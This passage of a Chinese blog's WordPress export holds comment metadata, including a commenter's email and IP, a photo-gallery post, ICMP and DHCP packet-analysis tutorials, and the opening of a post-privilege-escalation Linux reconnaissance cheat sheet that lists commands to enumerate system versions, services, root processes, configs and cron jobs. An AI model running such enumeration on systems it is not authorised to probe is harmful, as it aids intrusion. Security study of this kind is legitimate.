			<wp:comment_author_IP><![CDATA[113.104.33.91]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-05-27 21:12:21]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-05-27 13:12:21]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[小樱花~~~]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>7</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>11</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.91]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-05-27 21:12:27]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-05-27 13:12:27]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[小樱花~小樱花~]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>9</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>12</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.91]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-05-27 21:12:34]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-05-27 13:12:34]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[小樱花~小樱花~小樱花~小樱花~小樱花~小樱花~]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>11</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>宫脇咲良Google+配图 – No.002</title>
		<link>https://www.nervgeek.com/2016/06/04/%e5%ae%ab%e8%84%87%e5%92%b2%e8%89%afgoogle%e9%85%8d%e5%9b%be-no-002/</link>
		<pubDate>Fri, 03 Jun 2016 23:21:11 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1311</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o52ft6FsKC1up7w0jo1_1280.jpg"><img class="size-full wp-image-1312 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o52ft6FsKC1up7w0jo1_1280.jpg" alt="tumblr_o52ft6FsKC1up7w0jo1_1280" width="515" height="685" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o4felu2AUr1v7dt1bo8_1280.jpg"><img class="alignnone size-full wp-image-1313" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o4felu2AUr1v7dt1bo8_1280.jpg" alt="tumblr_o4felu2AUr1v7dt1bo8_1280" width="1280" height="720" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o4felu2AUr1v7dt1bo7_1280.jpg"><img class="alignnone size-full wp-image-1314" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o4felu2AUr1v7dt1bo7_1280.jpg" alt="tumblr_o4felu2AUr1v7dt1bo7_1280" width="1280" height="720" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o4felu2AUr1v7dt1bo4_1280.jpg"><img class="alignnone size-full wp-image-1315" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o4felu2AUr1v7dt1bo4_1280.jpg" alt="tumblr_o4felu2AUr1v7dt1bo4_1280" width="1280" height="720" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5r1p5A5SB1uyi5jso1_1280-3.jpg"><img class="size-full wp-image-1316 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5r1p5A5SB1uyi5jso1_1280-3.jpg" alt="tumblr_o5r1p5A5SB1uyi5jso1_1280 (3)" width="720" height="960" /></a>
<!--nextpage-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5fbbiWmFb1riz1uso1_1280.jpg"><img class="size-full wp-image-1317 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5fbbiWmFb1riz1uso1_1280.jpg" alt="tumblr_o5fbbiWmFb1riz1uso1_1280" width="640" height="852" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o4felu2AUr1v7dt1bo1_1280.jpg"><img class="alignnone size-full wp-image-1318" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o4felu2AUr1v7dt1bo1_1280.jpg" alt="tumblr_o4felu2AUr1v7dt1bo1_1280" width="1280" height="720" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o57r8oRIys1riz1uso1_1280.jpg"><img class="alignnone size-full wp-image-1319" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o57r8oRIys1riz1uso1_1280.jpg" alt="tumblr_o57r8oRIys1riz1uso1_1280" width="960" height="1280" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o54ufwNUFF1uyi5jso3_1280.jpg"><img class="size-full wp-image-1320 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o54ufwNUFF1uyi5jso3_1280.jpg" alt="tumblr_o54ufwNUFF1uyi5jso3_1280" width="640" height="852" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o54ufwNUFF1uyi5jso1_1280.jpg"><img class="size-full wp-image-1321 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o54ufwNUFF1uyi5jso1_1280.jpg" alt="tumblr_o54ufwNUFF1uyi5jso1_1280" width="640" height="852" /></a>
<!--nextpage-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5bmkziVOd1riz1uso1_1280.jpg"><img class="size-full wp-image-1322 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5bmkziVOd1riz1uso1_1280.jpg" alt="tumblr_o5bmkziVOd1riz1uso1_1280" width="640" height="852" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o548yaaBHR1up7w0jo1_1280.jpg"><img class="size-full wp-image-1323 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o548yaaBHR1up7w0jo1_1280.jpg" alt="tumblr_o548yaaBHR1up7w0jo1_1280" width="515" height="685" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o52hf4rHhY1riz1uso1_1280.jpg"><img class="size-full wp-image-1324 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o52hf4rHhY1riz1uso1_1280.jpg" alt="tumblr_o52hf4rHhY1riz1uso1_1280" width="640" height="852" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5xtfgE08g1up7w0jo1_1280.jpg"><img class="size-full wp-image-1325 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5xtfgE08g1up7w0jo1_1280.jpg" alt="tumblr_o5xtfgE08g1up7w0jo1_1280" width="515" height="685" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o4felu2AUr1v7dt1bo3_1280.jpg"><img class="alignnone size-full wp-image-1326" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o4felu2AUr1v7dt1bo3_1280.jpg" alt="tumblr_o4felu2AUr1v7dt1bo3_1280" width="1280" height="720" /></a>
<!--nextpage-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5r1p5A5SB1uyi5jso1_1280-1.jpg">
</a><a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o6ld0flrV01u88k6xo2_1280.jpg"><img class="size-full wp-image-1332 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o6ld0flrV01u88k6xo2_1280.jpg" alt="tumblr_o6ld0flrV01u88k6xo2_1280" width="596" height="793" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o6ld0flrV01u88k6xo1_1280.jpg"><img class="size-full wp-image-1333 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o6ld0flrV01u88k6xo1_1280.jpg" alt="tumblr_o6ld0flrV01u88k6xo1_1280" width="596" height="793" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5r1p5A5SB1uyi5jso1_1280.jpg"><img class="size-full wp-image-1329 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5r1p5A5SB1uyi5jso1_1280.jpg" alt="tumblr_o5r1p5A5SB1uyi5jso1_1280" width="720" height="960" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5qfa4iDjA1up7w0jo1_500.jpg"><img class="size-full wp-image-1330 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o5qfa4iDjA1up7w0jo1_500.jpg" alt="tumblr_o5qfa4iDjA1up7w0jo1_500" width="500" height="665" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o63ft0taYJ1riz1uso1_1280.jpg"><img class="size-full wp-image-1331 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/tumblr_o63ft0taYJ1riz1uso1_1280.jpg" alt="tumblr_o63ft0taYJ1riz1uso1_1280" width="640" height="852" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1311</wp:post_id>
		<wp:post_date><![CDATA[2016-06-04 07:21:11]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-06-03 23:21:11]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%ae%ab%e8%84%87%e5%92%b2%e8%89%afgoogle%e9%85%8d%e5%9b%be-no-002]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="g"><![CDATA[G+]]></category>
		<category domain="post_tag" nicename="google"><![CDATA[Google+]]></category>
		<category domain="category" nicename="%e5%86%99%e7%9c%9f"><![CDATA[写真]]></category>
		<category domain="post_tag" nicename="%e5%ae%ae%e8%84%87%e5%92%b2%e8%89%af"><![CDATA[宮脇咲良]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[1332]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[527]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>ICMP协议分析</title>
		<link>https://www.nervgeek.com/2015/10/15/icmp%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90/</link>
		<pubDate>Thu, 15 Oct 2015 10:40:00 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=170</guid>
		<description></description>
		<content:encoded><![CDATA[ICMP是（Internet Control Message Protocol）Internet控制报文协议。它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。
<strong>5.1 ICMP头</strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2015/10/6599269889424860116.jpg"><img class="alignnone size-full wp-image-172" src="https://www.nervgeek.com/wp-content/uploads/2015/10/6599269889424860116.jpg" alt="6599269889424860116" width="500" height="152" /></a>

<ul>
    <li><strong>类型Type(8bit)：</strong>标识生成的错误报文，它是ICMP报文中的第一个字段；</li>
    <li><strong>代码 Code(8bit)：</strong>进一步地限定生成ICMP报文。该字段用来查找产生错误的原因；</li>
    <li><strong>校验和 Checksum(16bit)：</strong>存储了ICMP所使用的校验和值。</li>
    <li><strong>未使用：</strong>保留字段，供将来使用，起值设为0</li>
    <li><strong>数据 Data：</strong>包含了所有接受到的数据报的IP报头。还包含IP数据报中前8个字节的数据；</li>
</ul>

<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/bb77a1bb72e4bc6837e863db31655fc2.png" alt="" border="0" hspace="0" vspace="0" />
ICMP在沟通之中，主要是透过不同的<strong>类别</strong><strong>(Type)与</strong><strong>代码</strong><strong>(Code) 域</strong>让机器来识别不同的连线状况。
<!--more-->
<strong>    5.2 PING</strong>
ping命令可用来检测其设备是否在线（可以ping其域名或其IP）
<a href="https://www.nervgeek.com/wp-content/uploads/2015/10/6608189127749180322.png"><img class="alignnone size-full wp-image-174" src="https://www.nervgeek.com/wp-content/uploads/2015/10/6608189127749180322.png" alt="6608189127749180322" width="453" height="233" /></a>
其中可以获取其响应。
ping传输过程中有2个包<strong>一个请求，一个响应</strong>。
<img class="alignnone size-full wp-image-173" src="https://www.nervgeek.com/wp-content/uploads/2015/10/2-1072500253621058525-1-1.png" alt="2072500253621058525" width="500" height="23" />
展开第一个echo请求包
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/e1865dd152179d4d3f319022dbd7436d.png" alt="" border="0" hspace="0" vspace="0" />
重点查看其<strong>Type域和Code域</strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2015/10/1-1823394899231992993-1-1.jpg"><img class="alignnone size-full wp-image-175" src="https://www.nervgeek.com/wp-content/uploads/2015/10/1-1823394899231992993-1-1.jpg" alt="1823394899231992993" width="500" height="346" /></a>
从上图我们可以得到type域值为8，code域为0说明这个是ICMP的ping请求。
图中多了<strong>Identifier（BE）、Identifier（LE）、Sequence number(BE)、Sequence number(LE) </strong>多了这几个选项，因为wireshark考虑到window系统与Linux系统发出的ping报文（主要指ping应用字段而非包含IP头的ping包）的字节顺序不一样（<strong>Windows为LE：little-endian byte order，Linux为BE：big-endian</strong>），为了体现wireshark的易用性，开发者将其分别显示出来。（来源http://www.vants.org/?post=133）
所以我们只要单独看LE就行。
之后是第二个包 <strong>echo响应</strong>
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/9f9ecec5263db328cfed315e19d6db71.png" alt="" border="0" hspace="0" vspace="0" />
type和code都为0 代表其为ping reply包
对应和上一个请求包Sequence number（LE） 是一样的，而且在date值也相等。
&nbsp;
<strong>5.3 Tracert</strong>
Tracert（跟踪路由）是路由跟踪实用程序，用于确定 IP 数据包访问目标所采取的路径。Tracert 命令用 IP 生存时间 (TTL) 字段和 ICMP 错误消息来确定从一个主机到网络上其他主机的路由。(Windows)
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/4-1d4bc1fd69af4f273cc8125919487a62-1-1.png" alt="" border="0" hspace="0" vspace="0" />
通过向目标发送不同IP生存时间 (TTL) 值的“Internet控制消息协议 (ICMP)”回应数据包，Tracert诊断程序确定到目标所采取的路由。要求路径上的每个路由器在转发数据包之前至少将数据包上的 TTL 递减 1。数据包上的 TTL 减为 0 时，路由器应该将“ICMP 已超时”的消息发回源系统。
Tracert 先发送 TTL 为 1 的回应数据包，并在随后的每次发送过程将TTL递增 1，直到目标响应或 TTL 达到最大值，从而确定路由。通过检查中间路由器发回的“ICMP 已超时”的消息确定路由。某些路由器不经询问直接丢弃 TTL 过期的数据包，这在 Tracert 实用程序中看不到。
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/034a1bd266627dee6fdb4995ddd859d2-1-1.png" alt="" border="0" hspace="0" vspace="0" />
可以发现主机192.168.100.138 tracert远程主机4.2.2.1
展开第一个包
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/a63283ad47bb40e101304ef4ab83175f.png" alt="" border="0" hspace="0" vspace="0" />
发现其TTL值为1 ，我们知道TTL每经过一个路由至少减一（理论减一），为0，则数据包不能继续传输，回复给主机，所以第二个数据包的发送者为192.168.100.1，为主机192.168.100.138的网关。
从第一个图可以发现，主机对目标都请求了三次，从命令行中也可以发现。
之后每个节点也回复了三次。
<a href="https://www.nervgeek.com/wp-content/uploads/2015/10/6608904909817743613.jpg"><img class="alignnone size-full wp-image-176" src="https://www.nervgeek.com/wp-content/uploads/2015/10/6608904909817743613.jpg" alt="6608904909817743613" width="500" height="366" /></a>
直到到达目标端。
<a href="https://www.nervgeek.com/wp-content/uploads/2015/10/2-1215208066813769999-1-1.png"><img class="alignnone size-full wp-image-177" src="https://www.nervgeek.com/wp-content/uploads/2015/10/2-1215208066813769999-1-1.png" alt="2215208066813769999" width="500" height="58" /></a>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>170</wp:post_id>
		<wp:post_date><![CDATA[2015-10-15 18:40:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-15 10:40:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[icmp%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="icmp"><![CDATA[ICMP]]></category>
		<category domain="post_tag" nicename="%e5%8d%8f%e8%ae%ae"><![CDATA[协议]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[150]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>DHCP协议分析</title>
		<link>https://www.nervgeek.com/2015/10/16/dhcp%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90/</link>
		<pubDate>Fri, 16 Oct 2015 01:31:34 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=185</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>DHCP</strong>(Dynamic Host Configuration Protocol，动态主机配置协议)是一个<a href="http://baike.baidu.com/view/788.htm" target="_blank" rel="nofollow">局域网</a>的<a href="http://baike.baidu.com/view/16603.htm" target="_blank" rel="nofollow">网络协议</a>，使用<a href="http://baike.baidu.com/view/30509.htm" target="_blank" rel="nofollow">UDP</a>协议工作，主要有两个用途：给内部网络或<a href="http://baike.baidu.com/view/1279152.htm" target="_blank" rel="nofollow">网络服务</a>供应商自动分配<a href="http://baike.baidu.com/view/3930.htm" target="_blank" rel="nofollow">IP地址</a>，给用户或者内部<a href="http://baike.baidu.com/view/31921.htm" target="_blank" rel="nofollow">网络管理员</a>作为对所有<a href="http://baike.baidu.com/view/3314.htm" target="_blank" rel="nofollow">计算机</a>作中央管理的手段。
<strong>6.1 DHCP头</strong>
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/4-1330330d37bd9928e201bf1fcfab8a3f-1-1.jpg" alt="" border="0" hspace="0" vspace="0" />
<!--more-->

<ul>
    <li><strong>操作代码OP ：</strong>若是client送给server的封包，设为1，反向为2。</li>
    <li><strong>硬件类别Htype：</strong>ethernet为1。</li>
    <li><strong>硬件长度Hlen：</strong>ethernet为6。</li>
    <li><strong>跳数Hops：</strong>若数据包需经过router传送，每站加1，若在同一网内，为0。</li>
    <li><strong>事务ID Transaction ID：</strong>是个随机数，用于客户和服务器之间匹配请求和相应消息。</li>
    <li><strong>时间 Seconds：</strong>由用户指定的时间，指开始地址获取和更新进行后的时间。</li>
    <li><strong>标志 Flags：</strong>从0-15bits，最左一bit为1时表示server将以广播方式传送封包给 client，其余尚未使用。</li>
    <li><strong>Ciaddr(client ip address)：</strong>客户端的IP地址。</li>
    <li><strong>Yiaddr(Your ip address)：</strong>DHCP服务器提供的IP地址。</li>
    <li><strong>Siaddr(Server ip address)：</strong>DHCP服务器的IP地址。</li>
    <li><strong>Giaddr（Gateway ip address）：</strong>网关的IP地址。</li>
    <li><strong>Chaddr （Client ip address）：</strong>client的硬件地址。</li>
    <li><strong>Sname：</strong>可选server的名称，以0x00结尾。</li>
    <li><strong>File：</strong>启动文件名。</li>
    <li><strong>Options：</strong>厂商标识，可选的参数字段</li>
</ul>

&nbsp;
<strong>2.2 IP地址的租用</strong>
DHCP的续租使用4种类型的DHCP数据包：发现(Discover)、提供(Offer)、请求(Request)、确认(Acknowledgement)。
第一种发现数据包就是主机用来发现DHCP服务器的请求包，之后DHCP服务器给主机一个offer，表明我就是主机所需要的DHCP服务器，之后主机向其请求ip地址，之后服务器将其分配的IP送给主机。（具体细节请看下面）
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/ef57e1fcd2468afd1c31fc72a6608838.png" alt="" border="0" hspace="0" vspace="0" />
<strong>    2.2.1发现（Discover）</strong>
可以发现souree IP 为0.0.0.0，说明主机还未获取IP地址，之后广播，寻找DHCP服务器，所以称为发现（发现DCHP服务器）。
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/3-1126635a5e1efe4c9b1b2e7c881600e7-1-1.png" alt="" border="0" hspace="0" vspace="0" />
在传输层上标注了其发送端口为68、目的端口未67，且为UDP。
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/e80c1a1b3734dc8ac4151fbad801d7ab.png" alt="" border="0" hspace="0" vspace="0" />
展开主要的四个域都能得到很多信息。
第三个Option域中的ip地址为上一次DHCP获取的地址。
&nbsp;
<strong>    2.2.2 提供(Offer)</strong>
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/6-105da5b0c20eb3aebf757a2e7ab46942-1-1.png" alt="" border="0" hspace="0" vspace="0" />
我们可以看见其transaction id和 发现DHCP包的 transaction id相同，用于确认。另外2个类型的数据包（请求和确认）中的transaction id也是一样的。
其中Your IP address域中的IP地址就是要提供给客服端的ip地址。
<strong>  2.2.3 请求(Request)</strong>
此时我们发送方的ip地址仍为0.0.0.0，因为DHCP过程还未完全结束。
&nbsp;
<strong>    2.2.4 确认(Acknowledgement)</strong>
最后一步将其ip地址传给客服端。
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>185</wp:post_id>
		<wp:post_date><![CDATA[2015-10-16 09:31:34]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-16 01:31:34]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[dhcp%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="dhcp"><![CDATA[DHCP]]></category>
		<category domain="post_tag" nicename="%e5%8d%8f%e8%ae%ae"><![CDATA[协议]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[173]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>史上最全Linux提权后获取敏感信息方法</title>
		<link>https://www.nervgeek.com/2015/10/18/%e5%8f%b2%e4%b8%8a%e6%9c%80%e5%85%a8linux%e6%8f%90%e6%9d%83%e5%90%8e%e8%8e%b7%e5%8f%96%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%96%b9%e6%b3%95/</link>
		<pubDate>Sun, 18 Oct 2015 07:26:07 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=245</guid>
		<description></description>
		<content:encoded><![CDATA[在本文开始之前，我想指出我不是专家。据我所知，在这个庞大的区域,没有一个“神奇”的答案.分享，共享（我的出发点）。下面是一个混合的命令做同样的事情，在不同的地方，或只是一个不同的眼光来看待事物。我知道有更多的“东西”去寻找。这只是一个基本粗略的指南。并不是每一个命令，做好要注重细节.
文中的每行为一条命令，文中有的命令可能在你的主机上敲不出来，因为它可能是在其他版本的linux中所使用的命令。
列举关键点
（Linux）的提权是怎么一回事：
收集 – 枚举，枚举和一些更多的枚举。
过程 – 通过数据排序，分析和确定优先次序。
搜索 – 知道搜索什么和在哪里可以找到漏洞代码。
适应 – 自定义的漏洞，所以它适合。每个系统的工作并不是每一个漏洞“都固定不变”。
尝试 – 做好准备,试验和错误。
系统类型
<!--more-->
系统是什么版本?
cat /etc/issue
cat /etc/<em>-release
cat /etc/lsb-release
cat /etc/redhat-release
它的内核版本是什么？
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz
它的环境变量里有些什么？
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
是否有台打印机？
lpstat -a
应用与服务
正在运行什么服务？什么样的服务具有什么用户权限？
ps aux
ps -ef
top
cat /etc/service
哪些服务具有root的权限？这些服务里你看起来那些有漏洞,进行再次检查！
ps aux | grep root
ps -ef | grep root
安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk ‘$1 ~ /^.</em>r.<em>/
主机上有哪些工作计划？
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
